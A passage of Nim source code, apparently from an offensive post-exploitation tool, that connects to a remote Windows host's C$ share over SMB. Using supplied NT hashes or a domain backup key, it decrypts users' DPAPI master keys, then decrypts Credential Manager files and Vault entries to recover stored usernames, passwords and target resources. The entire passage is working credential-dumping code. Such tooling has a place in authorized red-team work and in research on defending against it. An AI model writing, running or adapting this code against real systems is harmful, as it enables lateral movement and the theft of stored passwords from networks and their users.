        let vcrdData = await smbtransfer.readFileIntoMemory(session, treeId, vaultDir & "\\" & vcrdEntry.name)
        if vcrdData.len < 44: continue

        var voff = 16
        voff += 4
        voff += 8
        voff += 4
        voff += 4
        let fnLen = int(readU32Le2(vcrdData, voff)); voff += 4
        var friendlyName = ""
        if fnLen > 0 and voff + fnLen <= vcrdData.len:
          friendlyName = credFromUtf16Le(vcrdData[voff ..< voff + fnLen])
        voff += fnLen

        if voff + 4 > vcrdData.len: continue
        let attrMapsSize = int(readU32Le2(vcrdData, voff)); voff += 4
        let numAttrs = attrMapsSize div 12
        if numAttrs == 0: continue

        var attrOffsets: seq[tuple[id: uint32; offset: int]]
        for i in 0 ..< numAttrs:
          let aoff = voff + i * 12
          if aoff + 12 > vcrdData.len: break
          let attrId  = readU32Le2(vcrdData, aoff)
          let attrOff = int(readU32Le2(vcrdData, aoff + 4))
          attrOffsets.add((attrId, attrOff))
        voff += attrMapsSize

        var vaultUser = ""
        var vaultPass = ""
        var vaultResource = ""

        for i, ao in attrOffsets:
          let dataStart = ao.offset
          let dataEnd = if i + 1 < attrOffsets.len: attrOffsets[i+1].offset else: vcrdData.len
          if dataStart >= vcrdData.len or dataEnd > vcrdData.len or dataEnd <= dataStart: continue

          let attrRaw = vcrdData[dataStart ..< dataEnd]
          if attrRaw.len < 17: continue

          let ivPresent = ord(attrRaw[4]) != 0
          if not ivPresent: continue
          let ivSize = int(readU32Le2(attrRaw, 5))
          if 9 + ivSize > attrRaw.len: continue
          let iv  = attrRaw[9 ..< 9 + ivSize]
          let enc = attrRaw[9 + ivSize ..< attrRaw.len]
          if enc.len == 0: continue

          let ctx = EVP_CIPHER_CTX_new2()
          if ctx == nil: continue
          defer: EVP_CIPHER_CTX_free2(ctx)
          let cipher = if vaultKey.len == 32: EVP_aes_256_cbc2() else: EVP_aes_128_cbc2()
          discard EVP_CIPHER_CTX_set_padding2(ctx, 1)
          if EVP_DecryptInit_ex2(ctx, cipher, nil,
              cast[pointer](unsafeAddr vaultKey[0]),
              if iv.len > 0: cast[pointer](unsafeAddr iv[0]) else: nil) != 1: continue
          var plain = newString(enc.len + 16)
          var outl: cint = 0
          discard EVP_DecryptUpdate2(ctx, cast[pointer](addr plain[0]), addr outl,
              cast[pointer](unsafeAddr enc[0]), cint(enc.len))
          var total = int(outl)
          discard EVP_DecryptFinal_ex2(ctx, cast[pointer](addr plain[total]), addr outl)
          plain.setLen(total + int(outl))

          let decoded = credFromUtf16Le(plain)
          case ao.id
          of 100: vaultResource = decoded
          of 101: vaultUser = decoded
          of 102: vaultPass = decoded
          else: discard

        if vaultUser.len > 0 or vaultResource.len > 0 or vaultPass.len > 0:
          let target = if vaultResource.len > 0: vaultResource else: friendlyName
          result.add DpapiCredential(
            file: vcrdEntry.name,
            target: target,
            username: vaultUser,
            credBlob: vaultPass,
            masterKeyGuid: vpolDec.guid)

proc fetchUserCredentials*(session: smb.SmbSession;
                           accounts: seq[tuple[username, ntHashHex: string]];
                           domain: string;
                           systemMasterKeys: seq[DpapiMasterKey];
                           domainBackupKey = ""): Future[seq[DpapiCredential]] {.async.} =
  let treeId = await session.connectShareTree("C$")
  if treeId == 0: return

  var allUserMasterKeys: seq[DpapiMasterKey]

  let usersListing = await smb.listShareDirectory(session, "C$", "Users")
  for userDir in usersListing.entries:
    if not userDir.isDirectory: continue
    if userDir.name in ["Public", "Default", "Default User", "All Users"]: continue

    let matchingNtHash =
      block:
        var h = ""
        let uLow = userDir.name.toLowerAscii()
        for a in accounts:
          if a.ntHashHex.len != 32: continue
          let aLow = a.username.toLowerAscii()
          let aShort = if '\\' in aLow: aLow[aLow.rfind('\\') + 1 .. ^1] else: aLow
          if aLow == uLow or aShort == uLow:
            h = a.ntHashHex
            break
        h

    if matchingNtHash.len == 0: continue

    let ntHashBytes = hexDecode(matchingNtHash)
    let premasterSha1 = $secureHash(ntHashBytes)
    var premasterBytes = ""
    var i = 0
    let sha1hex = premasterSha1.toLowerAscii()
    while i + 1 < sha1hex.len:
      premasterBytes.add char(parseHexInt(sha1hex[i .. i+1]))
      i += 2

    let protectBase = "Users\\" & userDir.name & "\\AppData\\Roaming\\Microsoft\\Protect"
    let sidListing = await smb.listShareDirectory(session, "C$", protectBase)

    for sidDir in sidListing.entries:
      if not sidDir.isDirectory: continue
      if not sidDir.name.startsWith("S-1-5-"): continue

      let protectPath = protectBase & "\\" & sidDir.name
      let mkListing = await smb.listShareDirectory(session, "C$", protectPath)

      var userMasterKeys: seq[DpapiMasterKey]
      userMasterKeys.add systemMasterKeys

      for mkEntry in mkListing.entries:
        if mkEntry.isDirectory or mkEntry.name.len != 36: continue
        let mkPath = protectPath & "\\" & mkEntry.name
        let mkData = await smbtransfer.readFileIntoMemory(session, treeId, mkPath)
        if mkData.len < 128: continue
        let (guid, masterBlob, backupBlob, domainBlob) = parseMasterKeyFile(mkData)
        if guid.len == 0: continue
        let blob = if masterBlob.len > 0: masterBlob else: backupBlob
        if blob.len == 0: continue
        var decrypted = decryptMasterKeyBlob(blob, premasterBytes)
        if decrypted.len != 64 and domainBackupKey.len > 0 and domainBlob.len > 0:
          decrypted = decryptMasterKeyWithDomainBackupKey(domainBlob, domainBackupKey)
        if decrypted.len == 64:
          var hexKey = ""
          for b in decrypted:
            const digits = "0123456789abcdef"
            hexKey.add digits[(ord(b) shr 4) and 0xf]
            hexKey.add digits[ord(b) and 0xf]
          let mk = DpapiMasterKey(guid: guid, keyType: "user-" & userDir.name, key: hexKey)
          userMasterKeys.add mk
          allUserMasterKeys.add mk

      for credPath in ["Users\\" & userDir.name & "\\AppData\\Local\\Microsoft\\Credentials",
                       "Users\\" & userDir.name & "\\AppData\\Roaming\\Microsoft\\Credentials"]:
        let credListing = await smb.listShareDirectory(session, "C$", credPath)
        if credListing.entries.len == 0: continue
        for credEntry in credListing.entries:
          if credEntry.isDirectory: continue
          let credFilePath = credPath & "\\" & credEntry.name
          let fileData = await smbtransfer.readFileIntoMemory(session, treeId, credFilePath)
          if fileData.len < 16: continue
          let blobData = fileData[12 .. ^1]
          let dec = decryptDpapiBlob(blobData, userMasterKeys)
          var cred =
            if dec.error.len == 0: parseDecryptedCredential(dec.plaintext)
            else: DpapiCredential(error: dec.error)
          cred.file = credEntry.name
          cred.filePath = credFilePath
          cred.masterKeyGuid = dec.guid
          result.add cred

  if allUserMasterKeys.len > 0:
    const sysPaths = [
      "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials",
      "Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials",
    ]
    for dirPath in sysPaths:
      let listing = await smb.listShareDirectory(session, "C$", dirPath)
      for entry in listing.entries:
        if entry.isDirectory: continue
        let fileData = await smbtransfer.readFileIntoMemory(session, treeId, dirPath & "\\" & entry.name)
        if fileData.len < 16: continue
        let blobData = fileData[12 .. ^1]
        let dec = decryptDpapiBlob(blobData, allUserMasterKeys)
        if dec.error.len > 0: continue
        var isSysMk = false
        for sk in systemMasterKeys:
          if sk.guid.toLowerAscii() == dec.guid.toLowerAscii():
            isSysMk = true
            break
        if isSysMk: continue
        var cred = parseDecryptedCredential(dec.plaintext)
        cred.file = entry.name
        cred.filePath = dirPath & "\\" & entry.name
        cred.masterKeyGuid = dec.guid
        result.add cred
